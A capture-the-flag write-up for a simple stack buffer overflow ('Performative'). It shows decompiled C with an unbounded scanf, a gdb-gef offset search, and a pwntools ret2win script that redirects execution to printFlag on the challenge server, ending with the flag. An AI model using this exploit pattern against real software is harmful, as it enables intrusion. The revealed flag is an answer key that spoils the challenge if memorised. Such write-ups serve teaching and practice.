# Performative

On starting the challenge, this is what I had to work with:  

```
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Generating your buffer...

Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    165023 segmentation fault (core dumped)  ./perf
```

`checksec` and `file` output: 

```
➜  ~/Documents/recruitment/haard_phase2/binex/performative/src git:(main) ✗ checksec --file=perf
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbols		   FORTIFY	Fortified	   Fortifiable	   FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   38 Symbols	No	   0	   	   2	   	   perf
➜  ~/Documents/recruitment/haard_phase2/binex/performative/src git:(main) ✗ file perf
perf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0e0e9bd38ece3ea35906b5c60d694e440f8dec49, for GNU/Linux 4.4.0, with debug_info, not stripped
```

Lets decompile this program. 

Functions present in the code: 

```
printFlag
win
main
```

Code:

```c
void __cdecl printFlag()
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  FILE *f; // [rsp+108h] [rbp-8h]

  f = fopen("flag.txt", "r");
  if ( f )
  {
    while ( fgets(buf, 256, f) )
      printf("%s", buf);
    fclose(f);
  }
  else
  {
    puts("Error: flag.txt not found");
  }
}
void __cdecl win()
{
  puts(&byte_402030);
  puts("========================");
  puts("### Performative People Generator! ###");
  puts("========================");
  puts(&byte_402030);
  printFlag();
  fflush(stdout);
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buffer[32]; // [rsp+10h] [rbp-20h] BYREF

  setup();
  puts("### Welcome to the performative male/female parade! ###");
  puts(&byte_402030);
  puts("Yk what performative people like? just a plain ol' bof!");
  puts("\nLets just generate a buffer then ig?");
  printf("\nBuffer: ");
  __isoc23_scanf("%s", buffer);
  puts("Generating your buffer...");
  usleep(0x1F4u);
  puts(&byte_402030);
  puts("Your custom buffer:");
  puts("========================");
  puts(buffer);
  return 0;
}
```

Here the buffer is 32 bytes long, but `scanf` can take more than 32 bytes and cause a buffer overflow. 

As we can see, this is a simple buffer overflow exploit, we need to find the offset to the function `printFlag` and then run that function, to get the flag.  

To find the offset of the `printFlag` function, we need to open the program in `gdb`  to view the stack. 

We can find offset using `pattern create` and `pattern search` functions of `gdb-gef`. 

Commands used:
```
GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x00007fffffffdc18  →  0x00007fffffffdfa1  →  "/home/haard/Documents/recruitment/haard_phase2/bin[...]"
$rcx   : 0x00007ffff7d1c5a4  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffdaf8  →  "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x00007ffff7e04643  →  0xe05710000000000a ("\n"?)
$rdi   : 0x00007ffff7e05710  →  0x0000000000000000
$rip   : 0x00000000004013b2  →  <main+00d7> ret
$r8    : 0x64
$r9    : 0xffffffff
$r10   : 0x0
$r11   : 0x202
$r12   : 0x1
$r13   : 0x0
$r14   : 0x0000000000403df0  →  0x0000000000401170  →   endbr64
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdaf8│+0x0000: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"	 ← $rsp
0x00007fffffffdb00│+0x0008: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x00007fffffffdb08│+0x0010: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"
0x00007fffffffdb10│+0x0018: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"
0x00007fffffffdb18│+0x0020: "jaaaaaaakaaaaaaalaaaaaaamaaa"
0x00007fffffffdb20│+0x0028: "kaaaaaaalaaaaaaamaaa"
0x00007fffffffdb28│+0x0030: "laaaaaaamaaa"
0x00007fffffffdb30│+0x0038: 0x000000006161616d ("maaa"?)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4013a7 <main+00cc>      call   0x401030 <puts@plt>
     0x4013ac <main+00d1>      mov    eax, 0x0
     0x4013b1 <main+00d6>      leave
 →   0x4013b2 <main+00d7>      ret
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "perf", stopped 0x4013b2 in main (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4013b2 → main(argc=0x1, argv=0x7fffffffdc18)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search f
[+] Searching for '66'/'66' with period=8
[+] Found at offset 40 (little-endian search) likely
```

As we can see, we found the offset at 40. Now we can write our script to exploit the buffer overflow vulnerability.  

All we need our script to do is add padding of 40 bytes and insert the address of the function `printFlag` to run the function and get the flag.  

`script.py:`
```python
from pwn import * 

binary_file = './perf'

elf = ELF(binary_file)
p = remote('performative.nitephase.live', 56743)

offset = 40 
print(p.recvline())

address_of_printflag = elf.symbols['printFlag']


payload = [b'A'*offset, p64(address_of_printflag)]

p.sendline(b''.join(payload))
p.recvuntil(b':')


for i in range(6): 
    print(p.recvline())

p.close()
```

Output: 
```
[*] '/home/haard/Documents/recruitment/haard_phase2/binex/performative/src/perf'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to performative.nitephase.live on port 56743: Done
b'### Welcome to the performative male/female parade! ###\n'
b' Generating your buffer...\n'
b'\n'
b'Your custom buffer:\n'
b'========================\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe9\x11@\n'
b'nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}\n'
[*] Closed connection to performative.nitephase.live port 56743
```

**flag:** `nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}`

